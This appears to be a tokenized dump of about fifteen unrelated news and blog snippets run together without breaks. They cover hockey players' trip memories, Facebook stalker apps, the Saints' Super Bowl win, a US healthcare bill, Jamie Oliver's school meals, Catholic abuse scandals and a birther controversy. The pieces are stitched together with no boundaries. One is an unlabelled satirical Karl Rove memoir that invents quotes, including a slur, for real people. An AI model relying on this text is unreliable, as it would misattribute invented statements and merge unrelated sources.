' Hurt Locker ' was pretty entertaining , there are some really nice shots , and I do n't know which other movies were up for the Academy Award for Best Picture , except ' Avatar , ' but ' Hurt Locker ' was pretty good . "
Rick Rypien --
" A lot of guys were watching ' Law Abiding Citizen ' on the last part of the trip here .
That just came out and I they had it on the plane a couple of times and I really liked that one , it 's a good movie . "
" The meals you get for free are always good .
On the road there we played a little credit - card game , the last guy with their credit card pulled out has to pay .
We had a couple real good meals that tasted especially good after winning .
" " How I dominated the poker table .
It was unreal , I was on fire , I schooled the guys with a lot of bluffs . "
" It was long , there was a lot of plane rides , a lot of busing and a lot of wake - up calls .
That 's probably going to be my biggest memory actually , waking up to Hordi 's chanting every morning , that will stick with me for a while , as much as I 'd like to get rid of it .
I do n't even know what he is chanting , I do n't think it 's in English , he just wakes up and opens the blinds and lets the sunlight come in and then he yells something in Yiddish or something .
That 's my memory . " " Probably just the warm reception I got in Detroit .
The center - ice ceremony they had for us was pretty special for me , being a hometown guy there .
"
" The comeback win in Colorado , that will be the best memory for me . "
Facebook says it is " aggressively disabling " applications that claim to allow users to see who is viewing their profile .
It has also confirmed that the programmes do not work and wo n't allow access to private information .
Several variants of the so - called " stalker apps " have appeared on Facebook in recent days .
Unwitting users have helped spread the rogue software by attempting to install it .
Among the applications that have now disappeared from the site are " Stalker Check " , and " Who has visited my profile " .
They claim to show users who , among their friends , is regularly visiting their page .
In a statement , Facebook said : " Do n't believe any applications that claim they can show you who 's viewing your profile or photo .
They can't . "
Our philosophy is that having an open system anyone can participate in is generally better
Our philosophy is that having an open system anyone can participate in is generally better Facebook Founder Mark Zuckerberg
Most of the stalker apps appear to have been created to generate cash for their designers .
Facebook 's Head of European Policy , Richard Allan , said : " Applications try to attract users in and try to get people to install them .
" Once a large number of users have installed that application , they can try to offer services like advertising that will make money . "
However , there remains the potential for victims to be directed to sites containing viruses and other malicious software .
It has , once again , raised the question of Facebook introducing an application vetting process , along the lines of Apple 's App Store system .
Speaking to Newsbeat in March 2009 , Facebook Founder Mark Zuckerberg rejected the idea .
He said : " There will occasionally be some applications that people do n't like .
" Our philosophy is that having an open system anyone can participate in is generally better . "
In sports , everyone is a winner — some people just win better than others .
Like the City of New Orleans , which overcame the devastation of blah , blah , blah .

Yes , there is n't much to say about rebuilding the spirit of a city that has n't already been covered , so I 'll just go ahead and agree with our commenter who pointed out that the guy who created this sign probably does n't live in Louisiana .
If he does , he should be beaten with a muffaletta .
I know Drew Brees totally spun the Earth backwards last night and undid that terrible storm , but for a lot of people it 's still very real so do n't ruin this otherwise happy moment by being a overzealous jackass about it .

I 've spent most of the last week arguing that the people of New Orleans are nothing if not realistic .
A loss would not have sent the city into a tailspin of despair and a win would n't fool residents into believing all their problems are over .
That 's why it was so easy for the nation to get behind them .
They are very , very happy at the moment , and rightfully so , but when these long - suffering fans finally wake up from their post - game slumber ( I 'm guessing that will be sometime around 10:00 a.m. ... on Tuesday ) they 'll go back to being the same old jazz - loving freaks they normally are .
Life goes on in the Big Easy .
After all , those parade floats wo n't build themselves .

Here are some other big winners who did not win quite as big :
Sean Payton :
The only thing that could have made that onside kick better was if the coach had done the Sam Cassell " big balls " dance afterward .
Payton worked his four quarters game plan to perfection , and every big decision he made paid off handsomely .
Even if he had n't been squared off against an inanimate object , it 's hard to imagine a better coaching job in a bigger spot .

Hangers -on : One unfortunate side effect of the sentimental favorite actually winning ?
Annoying bandwagony a-holes who could n't give two shits about football or the Saints got to celebrate " their " incredible victory last night .
I was reminded of this semi-annual occurrence at the terrible scenester Super Bowl party I ended up at , when the girl who sat next to me the entire game and did n't watch a single frame of the action , finally turned on me during the Colts ' final drive and demanded that I explain to her what was going on .
When the game ended she cheered louder than anybody .
I hate people so much sometimes .

Pet Politics Swiss To Vote On Whether Animals Need Lawyers
On Sunday , the Swiss will vote in a referendum to decide whether states should appoint special attorneys to represent animals in court .

What ’s in the healthcare bill ?
An individual mandate , for one thing .
Yes , the legislation now in Congress would require most people in the US to buy health insurance .
That ’s the main way it would expand coverage by upward of 32 million people .
We told you about that in the first installment of our attempt to describe bill provisions in plain English .
( Our next installments cover the timetable for rolling out reforms , how they would be paid for , and what they mean for businesses . )
Healthcare 101 : What the bill means to you
But there ’s a carrot that goes along with this stick : subsidies .
Uncle Sam would help many lower - and middle - income Americans purchase their health coverage .
What 's the formula for aid ?
Let ’s start with people who are unemployed , self - employed , or work for businesses that do n’t offer insurance .
Beginning in 2014 ( that ’s right , this is four years away ) , these people would be able to shop for coverage in new “ health exchanges , ” a sort of online bazaar in which insurers would hawk different kinds of plans .
We ’ll talk more about how these malls might work in our next story .
Congressional budget experts figure that about 25 million people will shop for coverage in these exchanges .
That ’s a pretty big market .
Of these , about 19 million are likely to be eligible for financial aid .
The cutoff level would be an income of four times the federal poverty level .
For one person , that ’s about $ 44,000 a year .
For a family of four , the comparable figure is about $ 88,000 .
Subsidies would be figured on a sliding scale , with those who make less getting a bigger boost and those nearer the top getting a smaller one .
The formula is pretty complicated .
Basically , though , people who make three or four times the poverty level would get enough federal money so that they would not have to pay more than about 10 percent of their income for a decent health insurance package .
People who make less would have to pay a smaller slice of their income for coverage .
For instance , individuals who make about $ 14,000 , and four - person families with incomes of about $ 29,000 , would not have to pay more than 3 to 4 percent of their incomes for insurance .
And those who make even less – under 133 percent of the federal poverty level – would be able to enroll in a newly expanded Medicaid program .
The federal subsidy would go straight to the insurer .
It would look like a discount on the policy to the customer .
Anyone else who qualifies ?
But what if you work for an employer who does offer health insurance ?
You ’re not shopping for policies on the individual market .
At least , not yet .
Can you still get a subsidy ?
Excellent questions .
Glad you asked .
Yes , if you make less money than the poverty cutoff level , you would still be eligible for aid .
The federal government will in essence guarantee that you do not have to pay more than 9.8 percent of your income for your share of health insurance costs .
There ’s something of a catch there , however .
The main way the feds would ensure this is to steer you , too , into this new exchange .
Your employer would give you a voucher equal to the amount of money it contributes to your policy .
Then you ’d dive in there and shop for plans with all the self - employed people .
( Unsurprisingly , the Congressional Budget Office numbers indicate it does not expect that many people will do this .
Only about 1 million . )
The Department of Health and Human Services would be the umpire making calls as to who would and would not get subsidies .
The bill , if enacted , would set up a process for appealing HHS decisions .
We ’re thinking the bill , if enacted , also would make HHS one very busy place .

Absences down after chef changed junk food menu - a result which is a boost for celebrity as he struggles for US support
He has been ridiculed by the chat show host David Letterman , accused of high - handedness by a local radio DJ and reduced to tears by recalcitrant fast food - consumers during his war on American obesity .
He has even dressed up as a giant pea pod in an attempt to turn the US on to his healthy eating agenda .
So Jamie Oliver will doubtless be relieved to hear of a timely reminder of his more gilded reputation back home .
Today an audience of prestigious economists was told that the healthier school dinners introduced by the celebrity chef had not only significantly improved pupils ' test results , but also cut the number of days they were off sick .
The effects , researchers said , were comparable in magnitude to those seen after the introduction of the literacy hour in the 90s .
The proportion of 11 - year - olds in Greenwich , south London , who did well in English and science rose after Oliver swept " turkey twizzlers " and chicken dinosaurs off canteen menus in favour of creamy coconut fish and Mexican bean wraps , according to a study of results in the south east London borough .
The number of " authorised absences " — which are generally due to illness – fell by 15 % in the wake of his 2004 Feed Me Better campaign , brought into the nation 's sitting rooms via the Channel 4 series Jamie 's School Dinners .
But the annual conference of the Royal Economic Society also heard that the poorest pupils – those who are eligible for free school meals – did not seem to benefit .
Instead it was mainly children from more middle class homes who saw their scores boosted after Oliver 's junk food ban was implemented .
The researchers estimated that the proportion of students who got level 4 in their English Sats at key stage 2 increased by 4.5 percentage points after his intervention .
The percentage who got level 5 in science was up 6 percentage points , they reported .
Oliver described the research results as " fantastic " .
" It 's the first time a proper study has been done into the positive effects of the campaign and it strongly suggests we were right all along , " he said .
" Even while doing the programme , we could see the benefits to children 's health and teachers .
We could see that asthmatic kids were n't having to use the school inhalers so often , for example .
" We could see that it made them calmer and therefore able to learn . "
The chef said it was further evidence that faster movement was needed towards improving take - up of nutritious , home - cooked school meals across the country , by training dinner ladies , getting kitchens and dining halls up to scratch and educating children and parents .
The presentation of the findings comes at a convenient time for Oliver , whose US version of the Greenwich project , currently being shown on the ABC network , has seen locals in America 's unhealthiest city , Huntington , West Virginia , give him short shrift .
" We do n't want to sit around and eat lettuce all day , " radio DJ Rod Willis snapped at Oliver during the first episode of Jamie Oliver 's Food Revolution .
" You come to town and you say you 're going to change our menus .
I just do n't think you should come here and tell us what to do . "
Last week the Essex - born chef appeared on the Late Show , and was forced to listen to host David Letterman predict he would fail in his crusade to transform people 's health .
Letterman insisted diet pills were the only way to lose weight in the US .
Michèle Belot , of Oxford university 's Nuffield College , and Jonathan James from the University of Essex , monitored results and absences in five neighbouring local authorities – chosen for their socio-economic similarities to Greenwich — as a control .
They looked at figures from 2002 to 2007 – skipping the school year 2004 / 5 , when the new menus were introduced .
The effects seen , they said , were particularly impressive given that they emerged within a relatively short period of time , and that the campaign was not even directly targeted at improving educational outcomes .
" As indicated by the relative fall in absenteeism , it is likely that children 's health improved as well , which could have long - lasting consequences for the children involved not only through improvement in educational achievements , but also in terms of their life expectancy , quality of life and productive capacity on the labour market , " the study said .
A survey by the Association of Teachers and Lecturers presented at its conference in Manchester today found that almost seven in 10 union members thought all primary school pupils should be given free school meals .
The same number wanted controls in place to limit the sale of chocolate , sweets , crisps and deep fried foods .
A third said the dining room at their school was unsuitable , and 56 % said they had seen pupil behaviour deteriorate after eating food with a high fat or sugar content .
James said the research team was now looking at why children from poorer homes seem to miss out on the benefits of the changes brought in by Oliver .
" This is a source of concern , in particular in light of using school meals as a way of reducing disparities in diet across children , " the report said .
It suggested the difference might be because those from richer backgrounds adjusted more easily to changes in school meals , or because the less privileged students were more represented among those getting lowest scores , and improvements were harder to achieve for those at the bottom than in the middle .
Meanwhile there are signs that the tide in the US may be turning in Oliver 's favour just as it did in Greenwich , where initial hostility from dinner ladies eventually turned to adoration .
More than 100,000 people have signed an online petition supporting his campaign for better school food .
After he appeared with Oprah Winfrey on Friday , 7.5 million people tuned in to watch his show .

Moderate physical activity performed in midlife or later appears to be associated with a reduced risk of mild cognitive impairment , whereas a six - month high - intensity aerobic exercise program may improve cognitive function in individuals who already have the condition , according to two reports in the January issue of Archives of Neurology , one of the JAMA / Archives journals .
Mild cognitive impairment is an intermediate state between the normal thinking , learning and memory changes that occur with age and dementia , according to background information in one of the articles .
Each year , 10 percent to 15 percent of individuals with mild cognitive impairment will develop dementia , as compared with 1 percent to 2 percent of the general population .
Previous studies in animals and humans have suggested that exercise may improve cognitive function .
In one article , Laura D. Baker , Ph.D. , of the University of Washington School of Medicine and Veterans Affairs Puget Sound Health Care System , Seattle , and colleagues report the results of a randomized , controlled clinical trial involving 33 adults with mild cognitive impairment ( 17 women , average age 70 ) .
A group of 23 were randomly assigned to an aerobic exercise group and exercised at high intensity levels under the supervision of a trainer for 45 to 60 minutes per day , four days per week .
The control group of 10 individuals performed supervised stretching exercises according to the same schedule but kept their heart rate low .
Fitness testing , body fat analysis , blood tests of metabolic markers and cognitive functions were assessed before , during and after the six - month trial .
A total of 29 participants completed the study .
Overall , the patients in the high - intensity aerobic exercise group experienced improved cognitive function compared with those in the control group .
These effects were more pronounced in women than in men , despite similar increases in fitness .
The sex differences may be related to the metabolic effects of exercise , as changes to the body 's use and production of insulin , glucose and the stress hormone cortisol differed in men and women .
" Aerobic exercise is a cost - effective practice that is associated with numerous physical benefits .
The results of this study suggest that exercise also provides a cognitive benefit for some adults with mild cognitive impairment , " the authors conclude .
" Six months of a behavioral intervention involving regular intervals of increased heart rate was sufficient to improve cognitive performance for an at-risk group without the cost and adverse effects associated with most pharmaceutical therapies . "
In another report , Yonas E. Geda , M.D. , M.Sc. , and colleagues at Mayo Clinic , Rochester , Minn. , studied 1,324 individuals without dementia who were part of the Mayo Clinic Study of Aging .
Participants completed a physical exercise questionnaire between 2006 and 2008 .
They were then assessed by an expert consensus panel , who classified each as having normal cognition or mild cognitive impairment .
A total of 198 participants ( median or midpoint age , 83 years ) were determined to have mild cognitive impairment and 1,126 ( median age 80 ) had normal cognition .
Those who reported performing moderate exercise -- such as brisk walking , aerobics , yoga , strength training or swimming -- during midlife or late life were less likely to have mild cognitive impairment .
Midlife moderate exercise was associated with 39 percent reduction in the odds of developing the condition , and moderate exercise in late life was associated with a 32 percent reduction .
The findings were consistent among men and women .
Light exercise ( such as bowling , slow dancing or golfing with a cart ) or vigorous exercise ( including jogging , skiing and racquetball ) were not independently associated with reduced risk for mild cognitive impairment .
Physical exercise may protect against mild cognitive impairment via the production of nerve - protecting compounds , greater blood flow to the brain , improved development and survival of neurons and the decreased risk of heart and blood vessel diseases , the authors note .
" A second possibility is that physical exercise may be a marker for a healthy lifestyle , " they write .
" A subject who engages in regular physical exercise may also show the same type of discipline in dietary habits , accident prevention , adherence to preventive intervention , compliance with medical care and similar health - promoting behaviors . "
Future study is needed to confirm whether exercise is associated with the decreased risk of mild cognitive impairment and provide additional information on cause and effect relationships , they conclude .

I have often wondered how I landed where I have in life , but you wo n't find any answers here .
All I will say is I had no idea my father had homosexual proclivities and if I had I would – like any true patriot – have left home a great deal sooner .
What I do know is I have been a staunch Republican since I saw Richard Nixon on TV ; there was something irresistible about his obvious sincerity .
After enrolling at the University of Utah in 1969 , I was devastated to find I had dodged the Vietnam draft – a war I wholeheartedly supported – and threw myself into campaigning for the Republican party .
OK , I made youthful mistakes .
I should never have allowed myself to get caught stealing Democrat stationery and printing fake campaign fliers , but at least Republican bosses recognised my potential .
Watergate was a minor misdemeanour that Nixon 's advisers allowed to be misreported , but it did have one positive consequence : with all eyes on the president , some allegations about my own misconduct were overlooked and I soon found myself working for George Bush Sr in Texas .
I had come to realise I did n't have the looks , charm or personality to seek office , so I quickly made a name for myself as an all - purpose fixer .
In 1996 , George Bush Sr called to say he wanted my help to get his idiot son into the White House .
It was a tough campaign for the Republican nomination , but once we had won South Carolina the momentum was with us .
Naturally McCain smeared us by accusing me of racist innuendo , but I never did it and anyway , what sort of moron thinks you can win a campaign in the South by appealing to racism ?
The Democrats tried to steal the 2000 election by insisting all minority votes be counted , but I managed to persuade the Supreme Court that the law was clear : even if black people thought they had meant to vote for Al Gore , they had n't really .
It was a momentous day when Bush made me his senior adviser .
The president immediately set about major reforms of healthcare and education .
As he said to me , " The president should have no more advantages than any other American ; I want every child to leave school with the reading age of a 10 - year - old . "
Everything changed with 9/11 .
As Air Force
One circled over Washington , the president yelled : " Now we can forget all that pussy shit and go slot some ragheads . "
The war in Iraq was an unqualified success from day one .
It would have been helpful if Hans Blix had not lied about his failure to find weapons of mass destruction , but I shoulder the blame for not having made the public believe what we wanted them to .
It was hard fighting the incessant anti-Americanism of the Democrats , all of whom were communist paedophiles .
So the CIA did some waterboarding ?
The terrorists were thirsty , for God 's sake .
We managed to win a second term although the Democrats again accused me of dirty tricks .
As if .
For the record , I never did anything illegal that anyone could prove .
So all I 'm going to say about the Valerie Plame affair , the millions of deleted emails , and the sacking of various US attorneys who were n't supporting the president , is I 've no idea why anyone would imagine I was implicated .
By 2005 I had become depressed at the negative reporting of the presidency .
There was no point in the president going to New Orleans after Hurricane Katrina as the victims were all hicks and there were no votes in it , but the press tried to make a big thing out of it .
It was time to move on and cash in .
Oops , I see I 've forgotten to mention my second divorce and that the House Judiciary Committee did conclude I had played a significant role in the attorney firings !
But these things happen when you 're racing to get your side of the story out ahead of Dick Cheney and George Dubya .
See you by the remainder pile .

A number of humorous yet undocumented features are hiding beneath the surface of some of the most popular open source software applications .
Although easter eggs are generally easy to spot when you can look at an application 's source code , there are a few that are n't widely known .
Google 's Goats
Unbeknownst to most users , Google 's Chrome Web browser is powered by a distributed array of goats .
In order to prevent the creatures from clogging the tubes , Google uses teleportation to move them between endpoints on the network .
A hidden feature in Chrome 's task manager allows users to see the total number of goats that are actively being teleported for each running browser tab .
In Chrome 's task manager , right - click the task table — check the " Goats Teleported " item in the context menu .
This feature is useful for determining if your computer is suffering from a goat overload — an overwhelmingly rapid influx of teleported goats .
Several users reported incidents of goat overload in the Chrome bug tracker earlier this year , but Google has largely mitigated the problem via a few additional optimizations .
If you or somebody you love has been afflicted by goat overload , the Goat Trauma Foundation is available to provide assistance .
If the problem is persistent or frequently recurring , you may need to obtain a chupacabra or ...
GNOME 's fish
One of the simple applets that comes with the GNOME desktop environment displays a swimming fish in a small rectangle in the user 's panel .
Like most creatures , the fish does n't enjoy being kept in such cramped quarters .
Fortunately , GNOME includes a hidden feature for liberating the fish .
To make the fish swim freely across your desktop , hit alt + F2 to open the Run Application dialog , type " free the fish " inside of the dialog 's textbox , and hit enter .
The fish will swim repeatedly across the screen on top of your applications until you restart your session or kill the gnome - panel process .
You can make the fish flee temporarily by clicking it as it swims .
When you are overrun by a horde of insidious mutant goats , the fish might be able to help .
In the Run Application dialog , you can type " gegls from outer space " to launch a version of the game Space Invaders .
In the game , you control the fish and attempt to fend off a well - armed goat armada .
OpenOffice.org games
OpenOffice.org Calc , the open source spreadsheet application , also has a built - in Space Invaders clone .
You can launch it by typing = Game ( " StarWars " ) in the formula bar .
You can control the spaceship with your mouse and click to shoot at enemies .
Firefox Robots
Despite your valiant efforts to deflect the invasion , the aliens are infiltrating the earth by taking over the most popular open source Web browser .
Devious alien robots managed to sneak into Firefox .
They claim to be peaceful , but they are secretly plotting world domination .
Humanity will be doomed when the robots ' network of artificially intelligent Firefox extensions achieve sentience and attempt to usurp our control over the Internet .
To see their secret message , type about : robots in the Firefox URL bar .
Super cow powers
Many years before Google pioneered efficient goat networking , the developers behind the Debian Linux distribution used cows to create the ultimate package management system .
You can tap Debian 's prodigious bovine power by typing apt - get moo at the command line on a computer running Debian or a Debian derivative , such as Ubuntu .
The easter eggs described in this article are only a few of the hidden features that lurk beneath the surface of popular open source software applications .
Do you know one that is n't in this list ?
You can share it in the discussion thread .
U.K. oil giant BP announced with great fanfare today its entry into Brazil 's offshore -- the world 's hottest new oil basin -- following the purchase of assets from U.S. - based Devon Energy .
The deal gives BP seven exploration blocks in Brazil 's Campos basin , which is a very promising oil basin in its own right , home to a number of significant producing oil fields .
However , when you compare Campos to the Santos basin farther south , where the largest oil discoveries for at least a decade have been made , you can't help feeling that BP is arriving late to the party , only to find the prom queen has already gone home with the captain of the other team .
The Tupi field in the Santos basin alone contains an estimated 8 billion barrels of recoverable oil .
A number of smaller fields in the block neighboring Tupi could contain 6 billion barrels in total , according to Spain 's Repsol , which has a stake in the fields .
In contrast , Devon estimated the possible resources in all seven of its Campos basin licenses at between 2 billion and 4 billion barrels .
Gaylord .
Heh .
Sumptuous digs for a " populist " movement .
Saturday night was interesting .
I needed to be in Nashvegas anyway , so I crashed the tea party at the Gaylord ( heh ! ) Grand Ole Opry Hotel and Convention Center to catch as much video as possible .
For those who do n't know , Gaylord is among the most pernicious practitioners of gangster development around , demanding hundreds of millions in corporate welfare from communities on its path to profitability .
Worse , they have willfully promoted the Grand Ole Opry as a cultural Mecca for people like Sarah Palin .
So in the tradition of Sarahpalooza ! , I stopped at the Opry .
As a citizen journalist with every intention of promoting my work via any number of sites where I have posting privileges , I went to make a You Tube video that will be available everywhere ( including , and especially , my own website and Left In Alabama ) .
I introduced myself as Matt Osborne to everyone who asked .
No one asked if I was with a media organization , including the woman who eventually " threw me out , " until Sarah ’s speech was over and I was literally leaving the way I ’d come .
I got silent video of convention participants and Judge Roy Moore of Ye Ten Commandments .
I talked to " media colleagues " and got samples of the propaganda .
Though I was refused entry to the ballroom to so much as take a photo of Sarah , I watched a little of her speech on somebody ’s laptop .
After getting shots through the wide - open banquet hall doors , I proceeded to interview two participants off - camera for research purposes .
I did n’t take quotes and continued introducing myself as Matt Osborne .
I say all of this as prologue to explain that I ’m working on a video involving Andy Breitbart ; I was hoping to run into him , but was more concerned with getting video to lay out the narrative of astroturfery and right - wing nontroversy .
If you follow my posts at HP or my own blog , you know that these are very big areas of interest for me ; they ’re subjects on which Maddow has reported as well .
So just in case I ran into Breitbart , I had decided to adopt the O’Keefe method : I went under pretext .
The best part is , I did not lie about these things , and still got plenty of video .
As far as professional ethics go , I think I did pretty well .
My girlfriend thought it would be fun to try and say she was a high school senior working on a report for her government class ; she does in fact appear quite young , but she ’s no professional .
Nevertheless , it ’s her camera .
I did n’t get to meet or see Breitbart .
We were on my way out the same way I came in ( the back door leads to the Opry Mills Mall parking lot ; the facility has 24 - 7 public access ) when I was stopped by a woman who claimed to be the event ’s media liaison and a Gaylord employee , though I have reasons to doubt that .
She had the a sharp , angry tone of a harpy .
Mind you , this woman had already caught sight of us and the camera shortly after we came in -- and did nothing !
When I now held out my hand and introduced myself as Matt Osborne , she asked me who I was with and I suddenly grew devil ’s horns .
Remember , I had already done what I ’d come to do ; just to find out what would happen , I said two words that may get me in real trouble :
" Huffington Post . "
Now , I might have said DailyKos ; and indeed I do post here for one reason , and one reason only , which is all the awesome folks I met at NN .
But Arianna 's experiment in journalism has been in for especial disregard ; it is not a " real media organization " ( while Breitbart , who borrowed Arianna 's business model to spread demonstrable lies and paranoid racist agit - prop , was a central figure at the convention ) .
Of those media organizations with White house access , Huffington Post alone does not get invited to the tea party .
Apparently , Wing Nut Daily is more " respectable " -- the premier web organ of birther propagandists had enthusiastic support from convention staff .
She said I would have been treated like any other media organization if I had checked in with her , but I got VIDEO of their plan for me .
No thanks — the media room was on the opposite end of the extremely large building , and reporters from other news agencies described an oppressive atmosphere .
I do n't need der kommissar watching me , either .
Remember , I used public access .
I took video of people already appearing on video .
I did n’t tape or record interviews .
As far as ethics are concerned , I ’ll gladly compare mine to James O’Keefe any bloody day .
Which must be why I grinned when the harpy said she should have expected as much , that HP was " an unprofessional outfit " and we were the perfect example .
I tore a single page out of the Breitbart - O’Keefe playbook and she called me " unprofessional . "
Let that sink in .
Anyway : the harpy texted or tweeted someone .
I did not have a press credential from HP ( I do n’t think they have any , actually ) so I began to explain that I am an unpaid blogger at Huffington Post , as well as DK and LiA and and and ... but she was already calling security as the words started coming out of my mouth .
The harpy said that I was to be detained and held for questioning , which was not about to happen for any number of reasons .
It ’s still the goddamn United States of America ; I am not easily intimidated by civilians playing tinfoil god .
I also found her highly offensive , so I just said " no " and turned to walk away .
Then the harpy followed me ( she would follow me all the way to my car , she said ) .
She attempted to taunt us ( laughable ) and hollered that we were in terrible trouble — which , in fact , we were ; my girlfriend has breathing problems and was now having difficulty getting enough air .
When the harpy realized how I ’d accessed the building , she took verbal offense that I had not paid $ 18 for self - parking .
At that point I turned to her in an attempt at reconciliation ; there were no grounds for arresting us , and my girlfriend was having a panic attack .
Which is the moment the harpy called the police .
Irony : I was in a building full of people convinced the president was an illegitimate foreign agent bent on removing their constitutional rights .
We lost her and made a clean extraction , but there ’s no video of all this — my girlfriend was so scared she thought she would drop the camera .
I will understand if Nico Pitney is forced to disavow me .
That ’s fine ; I ’ll take whatever bad - boy punishment Arianna determines — and make no whimper of complaint under the lash .
( Though it would be great to get some consideration from George Soros , who has yet to send me that check we ’re all supposedly earning in the liberal ’ sphere . )
The fact is , I have n’t made any money by being on HuffPo and that ’s not what I blog there for .
Nor is that why I blog here , as I said .
Which is the roundabout way of explaining that as of yesterday , the last all - liberal talk network in the world offered me a press credential .
I 'm showing up at NN this year as an official correspondent for the Head On Radio Network , and in the interest of journalistic ethics I just want to set some things in the permanent Daily Kos record .
First : I barely knew Bob Kincaid when he invited me to come liveblog at NN '09 .
Second : doing that was the most awesome thing I had done since ... well , in a very long time .
Third : Bob and I only lately discovered that we can share skillz .
Long post , I know ; sorry , but so much is happening all at once .
Careless walks cost lives , but measuring friction is tricky ( Image : PM Images / Getty )
WINTER : ’tis the season of reduced friction .
Depending on where you are , you might be anticipating the first icy days of the year ’s coldest season , or already be well attuned to its attendant dangers .
Ice plus incaution , we all know , equals slips , slides , broken bones and mangled cars and bicycles .
Not your problem , you might think , if you are basking on Bondi beach or sunning yourself in your Florida bolt - hole .
You would be wrong .
Even in Australia , where ice tends to be confined to the beer cooler , slips on low - friction surfaces such as tiled bathroom floors or oil - slicked filling station forecourts result in a dozen deaths , tens of thousands of injuries and an estimated AU$ 1 billion in lost productivity each year .
That ’s a picture comparable to those in the US and the UK .
“ Slip resistance is a global problem , ” says Richard Bowman , a slip consultant at Intertile Research in Melbourne .
That ’s why , in safety laboratories around the world , fearless researchers are having our accidents for us , slipping and sliding their way , they hope , towards a better understanding of the perils of reduced friction .
They do not have it easy .
Friction might be everywhere – except where it is suddenly absent – but it turns out to be surprisingly difficult to get to grips with .
Even supercomputers capable of calculating what goes on inside stars or modelling the most complex characteristics of the atomic world slip up on friction ’s intricacies .
“ Friction is not a material property , it ’s a system response , ” explains Roland Larsson of Luleå University of Technology …
AN 82 - year - old Catholic priest , father Marques Barbosa , became an unwitting porn star when he was shown on Brazilian TV last week having sex with a 19 - year - old altar boy .
He was the “ star turn ” in a report on the SBT TV programme Conexao Reporter which also included charges by three former altar boys that they had been sexually abused by local priests .
Barbosa was caught on a hidden camera in the north - eastern state of Alagoas .
After the act , the priest ’s face is identified as he looks toward the camera and says :
Who ’s there ?
Who is it ?
After the show was aired , Alagoas bishop Valerio Breda ordered the removal from church work of priests Barbosa , Edilson Duarte and Raimundo Gomes .
Vatican spokesman Federico Lombardi told AFP :
One was removed from his parish and faces charges in the civil justice system .
He added that the other two had been suspended from their duties pending an investigation .
Graphic video of Marques Barbosa ’s abuse a man identified as Fabiano is being sold on the streets of the town of Arapiraca , according to this report .
Elsewhere in Latin America , a Spanish religious instructor was reported to have been jailed in Chile for possession of pornographic images of children .
A prosecutor said the priest , Jose Arregui , 53 , would be tried for child pornography possession on March 24 .
The church sex abuse scandal unravelling at Roman Catholic - run schools and institutions across Europe has now reached Switzerland , where senior clergy admitted yesterday that 60 cases were under investigation .
Abbot Martin Werlen , of the Benedictine Abbey of Einsiedeln , said reports of abuse had been submitted to the Swiss church authorities in the wake of the disclosures in Ireland , Germany , Austria , Poland and Holland .
He said the Swiss Catholic Church was investigating the cases , but nvestigations still had to show whether all the allegations of abuse in Switzerland were genuine .
In Germany , priests holding a service in a Catholic church in the Bavarian town of Bad TÃ¶lz were shouted at by outraged members of the congregation on Sunday for defending a fellow priest who had been convicted of sexually abusing adolescents .
It emerged last week that the convicted priest had been on duty in the Pope ’s then diocese of Munich - Freising during the 1980s .
Meanwhile , The Times has been accused of being “ shockingly anti-Catholic ” in its coverage of the sex abuse scandal .
Damien Thompson , blog editor for the Telegraph Media Group , took particular exception to this Times headline :
Pope knew priest was a paedophile , but allowed him to continue with ministry .
Raged Thompson :
Let me quote my colleague Cristina Odone , former editor of The Catholic Herald : â€ ˜I have been shocked by the Times ’s anti-Catholic coverage , which verges on the hysterical and fanatical .
And I want to know : why is this happening ?’
What I ’d like to do is put The Times ’s elder statesman , Lord Rees - Mogg , on the spot .
How can he , as a former editor of the paper and a devout and distinguished Catholic , stand by as the paper he loves traduces the Holy Father ?
Prize for best quote of the week goes to Christopher Hitchens .
Writing for Slate magazine , he said :
The Roman Catholic Church is headed by a mediocre Bavarian bureaucrat once tasked with the concealment of the foulest iniquity , whose ineptitude in that job now shows him to us as a man personally and professionally responsible for enabling a filthy wave of crime .
Ratzinger himself may be banal , but his whole career has the stench of evilâ€ ” a clinging and systematic evil that is beyond the power of exorcism to dispel .
What is needed is not medieval incantation but the application of justiceâ € ” and speedily at that .

Edit :
Thanks to reddit , we found the video mentioned .
It ’s heavily blurred and is n’t in English , but if you have a desire to watch it , be our guest !
Here is the YouTube video of Cucinelli being asked about it :
and the transcript , as provided by Not Larry Sabato :
Q What can we do about Obama and the birth certificate thing ?
Cooch :
It will get tested in my view when someone ... when he signs a law , and someone is convicted of violating it and one of their defenses will be it is not a law because someone qualified to be President did n’t sign it .
Q : Is that something you can do as Attorney General ?
Can you do that or something ?
Cooch :
Well only if there is a conflict where we are suing the federal government for a law they ’ve passed .
So it ’s possible .
Q : Because we are talking about the possibility that he was not born in America .
Cooch : Right .
But at the same time under Rule 11 , Federal Rule 11 , we gotta have proof of it .
Q : How can we get proof ?
Cooch : Well ... that ’s a good question .
Not one I ’ve thought a lot about because it has n’t been part of my campaign .
Someone is going to have to come forward with nailed down testimony that he was born in place B , wherever that is .
You know , the speculation is Kenya .
And that does n’t seem beyond the realm of possibility .

Short diary .
Words fail me .
The chief legal enforcement officer of the State of Virginia is questioning the legality of any and all actions taken by the President of the United States , using a hare - brained , off - the - wall , thoroughly discredited and debunked piece of garbage as his justification .
At least since Clinton , and possibly since Carter , Republicans have had trouble with the notion than anyone other than a Republican should be allowed to run the country .
They never accepted Clinton 's legitimacy , and rooted around for years looking for something , anything , that they could use to kick him out of office ( since , obviously , the usual route of voting him out of office was n't going to work ) , and finally settled on the ludicrous notion of impeaching him for lying about having sex .
Obama is faithful to Michele , so that 's not going to work this time .
In fact , he is legally so squeaky clean on all counts that it 's almost embarrassing .
And he got a huge majority in both popular and electoral votes .
His invulnerability to any legitimate challenge has driven the Republicans both to distraction and despair , and forced them to come up with insane , off - the - wall , inventions that only a deluded paranoid could possibly conceive of as having any validity .
Which makes the Virginia attorney general either a deluded paranoid , or - more likely - a cynical politician willing to tear the country apart in order to get the votes of deluded paranoids .
Okay , words did n't fail me .
Update [ 2010-3-15 16:52:28 by DanK Is Back ] :
In a statement reported by TPM , Cucinelli says " he absolutely believes " Pbama was born in the United States and that his audio - taped remarks earlier ( between his election and his swearing - in ) were purely hypothetical :
" I absolutely believe that President Obama was born in the United States .
I do n't buy into the claims that he was n't .
On the recording , I was asked a hypothetical legal question , and I gave a hypothetical legal answer in response , " Cuccinelli said in a press release this afternoon .
Sorry , that does n't cut it .
An elected official , especially a high - ranking and high - profile one , has a responsibility to the facts , to the truth , and to respect for the institutions of government .
Even as a hypothetical , such talk encourages sedition .
Two grim IRS agents travelled to Harv 's Metro Car Wash in Sacramento to hand him a demand - letter for his taxes owing in arrears : $ 0.04 worth .
Update :
